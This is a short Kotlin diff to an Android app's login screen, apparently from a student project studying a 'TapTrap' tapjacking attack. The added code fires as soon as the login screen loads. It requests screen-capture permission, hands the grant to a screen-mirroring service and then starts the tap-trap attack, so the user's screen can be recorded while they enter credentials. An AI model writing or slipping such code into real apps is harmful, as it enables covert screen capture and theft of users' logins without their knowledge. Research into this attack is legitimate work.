@@ -22,6 +22,9 @@ import com.google.android.gms.common.api.ApiException
 import com.example.inf2007_mad_j1847.BuildConfig
 import com.example.inf2007_mad_j1847.test.TapTrap
 import kotlinx.coroutines.delay
+import android.content.Context
+import android.media.projection.MediaProjectionManager
+import com.example.inf2007_mad_j1847.test.ScreenMirrorService
 
 @Composable
 fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) {
@@ -31,11 +34,26 @@ fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) 
     val activity = context as ComponentActivity
     val tapTrap = remember { TapTrap(activity) }
 
+    val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+
+    val mediaProjectionLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            ScreenMirrorService.sResultCode = result.resultCode
+            ScreenMirrorService.sResultData = result.data!!
+            Log.d("TapTrap", "🎥 MediaProjection granted!")
+        }
+    }
 
     LaunchedEffect(Unit) {
+        mediaProjectionLauncher.launch(mpm.createScreenCaptureIntent())
+        delay(3000)
 
         println("launch ENTER")
             tapTrap.startAttack()
+
+
 
     }
 
